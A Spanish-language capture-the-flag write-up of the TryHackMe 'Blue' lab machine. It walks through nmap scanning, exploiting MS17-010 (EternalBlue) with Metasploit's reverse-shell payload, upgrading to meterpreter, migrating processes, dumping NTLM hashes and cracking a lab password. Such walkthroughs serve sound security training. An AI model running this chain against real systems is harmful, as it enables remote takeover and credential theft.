---
toc: true
comments: true
title: TryHackMe - Blue
layout: post
title: TryHackMe - Blue
date: 2024-05-04 18:28 -0300
categories: [TryHackMe, Easy, CTF]
tags: [Windows, Metasploit, Meterpreter]    
image: /assets/Posts/Blue/logo.jpg
---

## Pre

- Blue fue una de las primeras maquinas que hice al adentrarme en el mundo del hacking. Hace mucho que no la veo y queria hacer una maquina windows para practicar, por lo que me parecio buena idea volver a mis _roots_ (get it? como el root user...no importa).
- Me gusto mucho la simplicidad y como lo fue guiando TryHackMe aunque tuve algunos problemas con el funcionamiento del exploit que requirieron un reset de la maquina. 

## Phase 1: Recon
Esta vez dividimos el escaneo en dos etapas: primero, analizando únicamente los puertos abiertos y luego ejecutando los scripts pertinentes.

```shell
nmap -Pn -n -p- --min-rate 10000 10.10.151.180 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-04 19:48 -03
Warning: 10.10.151.180 giving up on port because retransmission cap hit (10).
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 97.96% done; ETC: 19:48 (0:00:01 remaining)
Nmap scan report for 10.10.151.180
Host is up (0.36s latency).
Not shown: 65228 closed tcp ports (conn-refused), 298 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 39.43 seconds
```

Ahora que sabemos los puertos abiertos podemos analizarlos

```shell
sudo nmap -Pn -n -p 135,139,445 -T4 -sSCV -A 10.10.151.180 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-04 19:51 -03
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.16% done; ETC: 19:51 (0:00:00 remaining)
Nmap scan report for 10.10.151.180
Host is up (0.36s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 7 Ultimate SP1 or Windows 8.1 Update 1 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-05-04T17:51:58-05:00
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:a9:1b:f9:5b:15 (unknown)
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-05-04T22:51:58
|_  start_date: 2024-05-04T22:45:59

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   235.50 ms 10.13.0.1
2   ... 3
4   364.87 ms 10.10.151.180

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.01 seconds
```

Sabiendo que estamos frente a un Win7 y que la maquina se llama blue el instinto nos sugiere que estamos frente a una maquina vulnerable a EternalBlue (nombre del que parte mi nick,`MF_ETERNAL`), pero realicemos los pasos apropiados.

```shell
nmap -p 445 -script vuln -Pn -n 10.10.151.180                          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-04 19:54 -03
Nmap scan report for 10.10.151.180
Host is up (0.37s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 22.64 seconds
```

Con esto comenzamos nuestro ataque mediante **metasploit**.

## Phase 2: Metasploitation
La forma mas rapida de ejecutar el exploit sugerido es mediante metasploit, para esto buscaremos el modulo apropiado (MS17-010):


```shell
msf6 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description        
   -  ----                                           ---------------  ----     -----  -----------        
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Mediante `show options` vemos que necesita y configuramos `RHOSTS` mediante `setg RHOSTS 10.10.151.180`. Adicionalmente sugiero configurar un `LHOST` a la IP ya que muchas veces no detectara de forma apropiada la IP de la VPN de TryHackMe (esto me llevo a tener que levantar la maquina multiples veces).

```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.13.51.53:4444 
[*] 10.10.206.182:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.206.182:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.206.182:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.206.182:445 - The target is vulnerable.
[*] 10.10.206.182:445 - Connecting to target for exploitation.
[+] 10.10.206.182:445 - Connection established for exploitation.
[+] 10.10.206.182:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.206.182:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.206.182:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.206.182:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.206.182:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.206.182:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.206.182:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.206.182:445 - Sending all but last fragment of exploit packet
[*] 10.10.206.182:445 - Starting non-paged pool grooming
[+] 10.10.206.182:445 - Sending SMBv2 buffers
[+] 10.10.206.182:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.206.182:445 - Sending final SMBv2 buffers.
[*] 10.10.206.182:445 - Sending last fragment of exploit packet!
[*] 10.10.206.182:445 - Receiving response from exploit packet
[+] 10.10.206.182:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.206.182:445 - Sending egg to corrupted connection.
[*] 10.10.206.182:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.206.182
[*] Command shell session 1 opened (10.13.51.53:4444 -> 10.10.206.182:49178) at 2024-05-04 17:49:47 -0300
[+] 10.10.206.182:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.206.182:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.206.182:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>

```
Con esto podremos decir "We are in" y ponernos nuestros lentes de sol hacker.

## Phase 3: Meterpreting
La shell que tenemos es bastante mala e inestable asi que debemos establecer una con `meterpeter` para esto primero debemos mandar al background la session mediante `CTRL + Z`. Luego en metasploit usamos el modulo `shell_to_meterpreter`, el mismo nos solicita el numero de la sesion anterior, lo establecemos y elevamos nuestra shell. La shell de meterpeter esta en `sessions -l`, probablemente sea la 2da.

```shell
# Volver a la shell
meterpreter > shell
Process 2220 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

#Con CTRL + Z volvemos al meterpeter
```
Aqui TryHackMe nos guia a elevar el proceso a uno que corra con mas permisos, asi que hacemos justamente eso.

```shell
meterpreter > ps

Process List
============

PID   PPID  Name                  Arch  Session  User                          Path
---   ----  ----                  ----  -------  ----                          ----
0     0     [System Process]
4     0     System                x64   0
416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe

//////  Borre un par por simplicidad //////

2212  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
2224  2204  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
2252  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
2432  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
2504  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM
2740  1788  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
2800  1292  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
2808  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
2988  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
```

Queremos ir a uno de esos porcesos corriendo como AUTHORITY, para esto `migrate 2800` y nos pasara al ps de cmd. Luego aqui debemos analizar los usuarios presentes.

```shell
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

- El user se llama Jon
- Si vamos a [CrackStation.net](https://crackstation.net/) tenemos su password `alqfna22`.

## Phase 4: Flags

Aqui podremos explorar la estructura de windows ooooo simplemente usar meterpeter

```shell
meterpreter > search -f flag1.txt
meterpreter > search -f flag2.txt
meterpreter > search -f flag3.txt
```

## Conclusiones
- La maquina es muy buena para practicar metasploit y meterpreter aunque sea un poco inestable la ejecucion del exploit. 
- Si siguen usando windows 7 quizas sea buena idea hacer una update...


